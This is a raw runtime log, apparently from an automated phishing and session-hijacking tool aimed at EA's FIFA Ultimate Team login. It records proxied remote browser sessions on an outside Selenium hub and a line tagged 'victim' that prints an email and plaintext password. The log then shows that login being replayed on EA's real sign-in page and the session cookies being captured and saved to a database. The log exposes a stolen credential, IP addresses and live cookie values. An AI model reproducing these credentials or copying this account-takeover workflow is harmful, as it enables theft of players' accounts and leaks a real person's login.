INFO : 2021-02-13 19:55:07,084 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,084 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,084 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,084 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,084 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,085 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,085 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,090 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,090 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,090 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,090 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,090 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,090 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,090 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,090 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,091 - MariaDb has succussfully connected
INFO : 2021-02-13 19:55:07,093 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,093 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,093 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,093 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,097 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,097 - THREAD : setting up ip address
INFO : 2021-02-13 19:55:07,098 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,098 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:55:07,098 - creating a remote session !
INFO : 2021-02-13 19:55:07,098 - creating a remote session !
INFO : 2021-02-13 19:55:07,099 - creating a remote session !
INFO : 2021-02-13 19:55:07,099 - creating a remote session !
INFO : 2021-02-13 19:55:07,100 - creating a remote session !
INFO : 2021-02-13 19:55:07,098 - creating a remote session !
INFO : 2021-02-13 19:55:07,098 - creating a remote session !
INFO : 2021-02-13 19:55:07,103 - creating a remote session !
INFO : 2021-02-13 19:55:08,469 - THREAD : opening ea url
INFO : 2021-02-13 19:55:08,550 - THREAD : opening ea url
INFO : 2021-02-13 19:55:12,238 - THREAD : saving session to query 
INFO : 2021-02-13 19:55:12,482 - THREAD : saving session to query 
INFO : 2021-02-13 19:56:22,406 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,408 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,408 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,409 - creating a remote session !
INFO : 2021-02-13 19:56:22,424 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,426 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,426 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,427 - creating a remote session !
INFO : 2021-02-13 19:56:22,470 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,476 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,476 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,477 - creating a remote session !
INFO : 2021-02-13 19:56:22,516 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,518 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,518 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,521 - creating a remote session !
INFO : 2021-02-13 19:56:22,683 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,685 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,685 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,689 - creating a remote session !
INFO : 2021-02-13 19:56:22,740 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,745 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,745 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,760 - creating a remote session !
INFO : 2021-02-13 19:56:22,885 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,889 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,889 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,890 - creating a remote session !
INFO : 2021-02-13 19:56:22,893 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:22,896 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:22,896 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:22,899 - creating a remote session !
INFO : 2021-02-13 19:56:23,484 - THREAD : opening ea url
INFO : 2021-02-13 19:56:27,208 - THREAD : saving session to query 
INFO : 2021-02-13 19:56:27,213 - session added to query ! 1
INFO : 2021-02-13 19:56:43,628 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:43,632 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:43,632 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:43,633 - creating a remote session !
INFO : 2021-02-13 19:56:43,665 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:43,669 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:43,669 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:43,669 - creating a remote session !
INFO : 2021-02-13 19:56:43,723 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:43,725 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:43,725 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:43,726 - creating a remote session !
INFO : 2021-02-13 19:56:43,742 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:43,745 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:43,745 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:43,746 - creating a remote session !
INFO : 2021-02-13 19:56:43,776 - MariaDb has succussfully connected
INFO : 2021-02-13 19:56:43,778 - THREAD : setting up ip address
INFO : 2021-02-13 19:56:43,778 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:56:43,779 - creating a remote session !
INFO : 2021-02-13 19:56:44,311 - THREAD : opening ea url
INFO : 2021-02-13 19:56:47,671 - THREAD : saving session to query 
INFO : 2021-02-13 19:56:47,672 - session added to query ! 2
INFO : 2021-02-13 19:57:57,763 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:57,766 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:57,766 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:57,767 - creating a remote session !
INFO : 2021-02-13 19:57:57,806 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:57,810 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:57,811 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:57,811 - creating a remote session !
INFO : 2021-02-13 19:57:57,909 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:57,914 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:57,915 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:57,922 - creating a remote session !
INFO : 2021-02-13 19:57:57,981 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:57,984 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:57,984 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:57,985 - creating a remote session !
INFO : 2021-02-13 19:57:57,986 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:57,988 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:57,988 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:57,990 - creating a remote session !
INFO : 2021-02-13 19:57:57,993 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:57,996 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:57,996 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:57,997 - creating a remote session !
INFO : 2021-02-13 19:57:57,997 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:58,005 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:58,005 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:58,007 - creating a remote session !
INFO : 2021-02-13 19:57:58,213 - MariaDb has succussfully connected
INFO : 2021-02-13 19:57:58,215 - THREAD : setting up ip address
INFO : 2021-02-13 19:57:58,215 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 19:57:58,216 - creating a remote session !
INFO : 2021-02-13 19:58:01,625 - THREAD : opening ea url
INFO : 2021-02-13 19:58:01,641 - THREAD : opening ea url
INFO : 2021-02-13 19:58:01,643 - THREAD : opening ea url
INFO : 2021-02-13 19:58:01,653 - THREAD : opening ea url
INFO : 2021-02-13 19:58:01,660 - THREAD : opening ea url
INFO : 2021-02-13 19:58:01,673 - THREAD : opening ea url
INFO : 2021-02-13 19:58:01,673 - THREAD : opening ea url
INFO : 2021-02-13 19:58:01,678 - THREAD : opening ea url
INFO : 2021-02-13 19:58:06,986 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:06,995 - session added to query ! 3
INFO : 2021-02-13 19:58:07,095 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:07,101 - session added to query ! 4
INFO : 2021-02-13 19:58:07,112 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:07,119 - session added to query ! 5
INFO : 2021-02-13 19:58:07,255 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:07,260 - session added to query ! 6
INFO : 2021-02-13 19:58:07,292 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:07,321 - session added to query ! 7
INFO : 2021-02-13 19:58:07,370 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:07,372 - session added to query ! 8
INFO : 2021-02-13 19:58:07,407 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:07,410 - session added to query ! 9
INFO : 2021-02-13 19:58:07,444 - THREAD : saving session to query 
INFO : 2021-02-13 19:58:07,450 - session added to query ! 10
INFO : 2021-02-13 20:01:22,540 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:22,543 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:22,543 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:22,544 - creating a remote session !
INFO : 2021-02-13 20:01:22,616 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:22,621 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:22,621 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:22,622 - creating a remote session !
INFO : 2021-02-13 20:01:22,697 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:22,699 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:22,699 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:22,700 - creating a remote session !
INFO : 2021-02-13 20:01:22,827 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:22,829 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:22,829 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:22,830 - creating a remote session !
INFO : 2021-02-13 20:01:22,839 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:22,842 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:22,842 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:22,843 - creating a remote session !
INFO : 2021-02-13 20:01:22,916 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:22,922 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:22,922 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:22,922 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:22,923 - creating a remote session !
INFO : 2021-02-13 20:01:22,925 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:22,925 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:22,926 - creating a remote session !
INFO : 2021-02-13 20:01:23,085 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:23,088 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:23,088 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:23,088 - creating a remote session !
INFO : 2021-02-13 20:01:24,930 - THREAD : opening ea url
INFO : 2021-02-13 20:01:24,931 - THREAD : opening ea url
INFO : 2021-02-13 20:01:24,942 - THREAD : opening ea url
INFO : 2021-02-13 20:01:24,963 - THREAD : opening ea url
INFO : 2021-02-13 20:01:24,964 - THREAD : opening ea url
INFO : 2021-02-13 20:01:24,969 - THREAD : opening ea url
INFO : 2021-02-13 20:01:24,970 - THREAD : opening ea url
INFO : 2021-02-13 20:01:24,971 - THREAD : opening ea url
INFO : 2021-02-13 20:01:30,067 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,070 - session added to query ! 11
INFO : 2021-02-13 20:01:30,094 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,096 - session added to query ! 12
INFO : 2021-02-13 20:01:30,172 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,176 - session added to query ! 13
INFO : 2021-02-13 20:01:30,384 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,393 - session added to query ! 14
INFO : 2021-02-13 20:01:30,469 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,472 - session added to query ! 15
INFO : 2021-02-13 20:01:30,478 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,484 - session added to query ! 16
INFO : 2021-02-13 20:01:30,860 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,862 - session added to query ! 17
INFO : 2021-02-13 20:01:30,922 - THREAD : saving session to query 
INFO : 2021-02-13 20:01:30,925 - session added to query ! 18
INFO : 2021-02-13 20:01:54,479 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,481 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,481 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,482 - creating a remote session !
INFO : 2021-02-13 20:01:54,490 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,493 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,494 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,494 - creating a remote session !
INFO : 2021-02-13 20:01:54,542 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,545 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,545 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,546 - creating a remote session !
INFO : 2021-02-13 20:01:54,737 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,739 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,740 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,740 - creating a remote session !
INFO : 2021-02-13 20:01:54,811 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,814 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,814 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,815 - creating a remote session !
INFO : 2021-02-13 20:01:54,819 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,821 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,821 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,822 - creating a remote session !
INFO : 2021-02-13 20:01:54,828 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,832 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,832 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,833 - creating a remote session !
INFO : 2021-02-13 20:01:54,967 - MariaDb has succussfully connected
INFO : 2021-02-13 20:01:54,970 - THREAD : setting up ip address
INFO : 2021-02-13 20:01:54,970 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:01:54,971 - creating a remote session !
INFO : 2021-02-13 20:01:56,295 - THREAD : opening ea url
INFO : 2021-02-13 20:01:56,355 - THREAD : opening ea url
INFO : 2021-02-13 20:01:57,603 - THREAD : opening ea url
INFO : 2021-02-13 20:01:59,287 - THREAD : opening ea url
INFO : 2021-02-13 20:01:59,302 - THREAD : opening ea url
INFO : 2021-02-13 20:01:59,819 - THREAD : opening ea url
INFO : 2021-02-13 20:01:59,932 - THREAD : opening ea url
INFO : 2021-02-13 20:02:00,189 - THREAD : opening ea url
INFO : 2021-02-13 20:02:03,717 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:03,722 - session added to query ! 19
INFO : 2021-02-13 20:02:03,733 - new user in !
INFO : 2021-02-13 20:02:04,158 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:04,160 - session added to query ! 20
INFO : 2021-02-13 20:02:04,197 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:04,201 - session added to query ! 21
INFO : 2021-02-13 20:02:04,362 - new user in !
INFO : 2021-02-13 20:02:05,476 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:05,481 - session added to query ! 22
INFO : 2021-02-13 20:02:05,482 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:05,494 - session added to query ! 23
INFO : 2021-02-13 20:02:05,507 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:05,511 - session added to query ! 24
INFO : 2021-02-13 20:02:05,575 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:05,577 - session added to query ! 25
INFO : 2021-02-13 20:02:05,703 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:05,706 - session added to query ! 26
INFO : 2021-02-13 20:02:36,870 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:36,872 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:36,873 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:36,873 - creating a remote session !
INFO : 2021-02-13 20:02:36,978 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:36,981 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:36,981 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:36,982 - creating a remote session !
INFO : 2021-02-13 20:02:37,029 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:37,031 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:37,031 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:37,032 - creating a remote session !
INFO : 2021-02-13 20:02:37,114 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:37,118 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:37,118 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:37,119 - creating a remote session !
INFO : 2021-02-13 20:02:37,166 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:37,168 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:37,168 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:37,169 - creating a remote session !
INFO : 2021-02-13 20:02:37,191 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:37,193 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:37,194 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:37,194 - creating a remote session !
INFO : 2021-02-13 20:02:37,294 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:37,298 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:37,298 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:37,300 - creating a remote session !
INFO : 2021-02-13 20:02:37,380 - MariaDb has succussfully connected
INFO : 2021-02-13 20:02:37,382 - THREAD : setting up ip address
INFO : 2021-02-13 20:02:37,383 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:02:37,383 - creating a remote session !
INFO : 2021-02-13 20:02:37,860 - THREAD : opening ea url
INFO : 2021-02-13 20:02:38,326 - THREAD : opening ea url
INFO : 2021-02-13 20:02:40,351 - THREAD : opening ea url
INFO : 2021-02-13 20:02:40,639 - THREAD : opening ea url
INFO : 2021-02-13 20:02:40,702 - THREAD : opening ea url
INFO : 2021-02-13 20:02:40,826 - THREAD : opening ea url
INFO : 2021-02-13 20:02:41,003 - THREAD : opening ea url
INFO : 2021-02-13 20:02:41,299 - THREAD : opening ea url
INFO : 2021-02-13 20:02:43,016 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:43,022 - session added to query ! 1
INFO : 2021-02-13 20:02:43,398 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:43,409 - session added to query ! 2
INFO : 2021-02-13 20:02:45,116 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:45,122 - session added to query ! 3
INFO : 2021-02-13 20:02:45,654 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:45,656 - session added to query ! 4
INFO : 2021-02-13 20:02:45,794 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:45,795 - session added to query ! 5
INFO : 2021-02-13 20:02:45,822 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:45,826 - session added to query ! 6
INFO : 2021-02-13 20:02:46,057 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:46,060 - session added to query ! 7
INFO : 2021-02-13 20:02:46,221 - THREAD : saving session to query 
INFO : 2021-02-13 20:02:46,228 - session added to query ! 8
INFO : 2021-02-13 20:02:58,510 - new user in !
INFO : 2021-02-13 20:03:02,730 - getting free session...
INFO : 2021-02-13 20:03:02,733 - session imported from query ! b'{"session_id": "ca44540535cf182a42388efacfdbac20", "executor_url": "http://144.91.92.58:4444/wd/hub"}'
INFO : 2021-02-13 20:03:02,736 - free sessions => 7
INFO : 2021-02-13 20:03:02,736 - free session => {'session_id': 'ca44540535cf182a42388efacfdbac20', 'executor_url': 'http://144.91.92.58:4444/wd/hub'}
INFO : 2021-02-13 20:03:02,737 - connecting to a free Session .. 
INFO : 2021-02-13 20:03:02,772 - https://signin.ea.com/p/web2/login?execution=e639895733s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26response_type%3Dtoken%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Ffifa%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3Dnull%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFIFA21_JS_WEB_APP
INFO : 2021-02-13 20:03:02,772 - THREAD : SESSION REPLACEMENT ..
INFO : 2021-02-13 20:03:02,772 - THREAD CREATED
INFO : 2021-02-13 20:03:02,772 - THREAD : setting up ip address
INFO : 2021-02-13 20:03:02,772 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:03:02,773 - creating a remote session !
INFO : 2021-02-13 20:03:02,773 - THREAD : STARTED
INFO : 2021-02-13 20:03:02,773 - THREAD : attach to session perfectly
WARNING : 2021-02-13 20:03:02,774 - victim : skidrow.crack1@gmail.com Aminewaka123!
INFO : 2021-02-13 20:03:02,774 - locating fields ..
INFO : 2021-02-13 20:03:02,774 - locating email:
INFO : 2021-02-13 20:03:03,209 - locating password
INFO : 2021-02-13 20:03:03,483 - click login
INFO : 2021-02-13 20:03:03,520 - THREAD : opening ea url
INFO : 2021-02-13 20:03:06,839 - login in..
INFO : 2021-02-13 20:03:06,884 - logged-in succesfully
INFO : 2021-02-13 20:03:06,942 - -----using old method----
INFO : 2021-02-13 20:03:07,716 - THREAD : saving session to query 
INFO : 2021-02-13 20:03:07,727 - session added to query ! 8
INFO : 2021-02-13 20:03:07,979 - Saving current session
INFO : 2021-02-13 20:03:07,980 - session saved to query ! 1
INFO : 2021-02-13 20:03:07,980 - succ
INFO : 2021-02-13 20:03:07,980 - skidrow.crack1@gmail.com Aminewaka123! 197.1.36.215
WARNING : 2021-02-13 20:03:07,980 - succ
INFO : 2021-02-13 20:03:08,056 - login infos added
INFO : 2021-02-13 20:03:12,540 - connecting to ur Session .. 
INFO : 2021-02-13 20:03:12,540 - getting MY SESSION...
INFO : 2021-02-13 20:03:12,542 - session -> b'{"session_id": "ca44540535cf182a42388efacfdbac20", "executor_url": "http://144.91.92.58:4444/wd/hub"}'
INFO : 2021-02-13 20:03:12,544 - locating fields ..
INFO : 2021-02-13 20:03:12,581 - sending keys
INFO : 2021-02-13 20:03:13,674 - button clicked
INFO : 2021-02-13 20:03:16,707 - GOT Cookies
INFO : 2021-02-13 20:03:16,777 - 657622021-02-13 20:03:02.730498 545454 197.1.36.215 [{"domain": "signin.ea.com", "expiry": 1613847784, "httponly": true, "name": "isphone", "path": "/", "samesite": "none", "secure": true, "value": "false"}, {"domain": "signin.ea.com", "expiry": 1613847784, "httponly": true, "name": "ispogo", "path": "/", "samesite": "none", "secure": true, "value": "false"}, {"domain": "signin.ea.com", "expiry": 1613847784, "httponly": true, "name": "webun", "path": "/", "samesite": "none", "secure": true, "value": "skidrow.crack1@gmail.com"}, {"domain": ".ea.com", "expiry": 1676314962, "httponly": false, "name": "_ga", "path": "/", "secure": false, "value": "ga1.2.1206264854.1613242962"}, {"domain": "signin.ea.com", "httponly": true, "name": "signin-cookie", "path": "/", "samesite": "none", "secure": true, "value": ""751b992ef7557363""}, {"domain": ".ea.com", "expiry": 1613243022, "httponly": false, "name": "_gat", "path": "/", "secure": false, "value": "1"}, {"domain": ".ea.com", "expiry": 1613329362, "httponly": false, "name": "_gid", "path": "/", "secure": false, "value": "ga1.2.493550376.1613242962"}, {"domain": "signin.ea.com", "httponly": true, "name": "jsessionid", "path": "/p", "samesite": "none", "secure": true, "value": "81b35d82be920515fc9e23588a0bec09.prdaccounts-84"}]
INFO : 2021-02-13 20:03:16,788 - code added
INFO : 2021-02-13 20:03:16,796 - cookies infos added TO DB
INFO : 2021-02-13 20:06:49,979 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:49,982 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:49,982 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:49,983 - creating a remote session !
INFO : 2021-02-13 20:06:49,984 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:49,986 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:49,986 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:49,987 - creating a remote session !
INFO : 2021-02-13 20:06:50,034 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:50,037 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:50,037 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:50,038 - creating a remote session !
INFO : 2021-02-13 20:06:50,148 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:50,150 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:50,150 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:50,151 - creating a remote session !
INFO : 2021-02-13 20:06:50,155 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:50,158 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:50,159 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:50,160 - creating a remote session !
INFO : 2021-02-13 20:06:50,287 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:50,289 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:50,289 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:50,291 - creating a remote session !
INFO : 2021-02-13 20:06:50,296 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:50,298 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:50,299 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:50,302 - creating a remote session !
INFO : 2021-02-13 20:06:50,345 - MariaDb has succussfully connected
INFO : 2021-02-13 20:06:50,348 - THREAD : setting up ip address
INFO : 2021-02-13 20:06:50,348 - THREAD : IP ADDR =>http://193.233.75.209:45785
INFO : 2021-02-13 20:06:50,349 - creating a remote session !
INFO : 2021-02-13 20:06:50,864 - THREAD : opening ea url
INFO : 2021-02-13 20:06:51,034 - THREAD : opening ea url
INFO : 2021-02-13 20:06:51,118 - THREAD : opening ea url
INFO : 2021-02-13 20:06:51,461 - THREAD : opening ea url
INFO : 2021-02-13 20:06:51,610 - THREAD : opening ea url
INFO : 2021-02-13 20:06:51,927 - THREAD : opening ea url
INFO : 2021-02-13 20:06:51,999 - THREAD : opening ea url
INFO : 2021-02-13 20:06:52,008 - THREAD : opening ea url
INFO : 2021-02-13 20:06:55,904 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:55,914 - session added to query ! 1
INFO : 2021-02-13 20:06:56,014 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:56,023 - session added to query ! 2
INFO : 2021-02-13 20:06:56,417 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:56,420 - session added to query ! 3
INFO : 2021-02-13 20:06:56,578 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:56,584 - session added to query ! 4
INFO : 2021-02-13 20:06:56,650 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:56,652 - session added to query ! 5
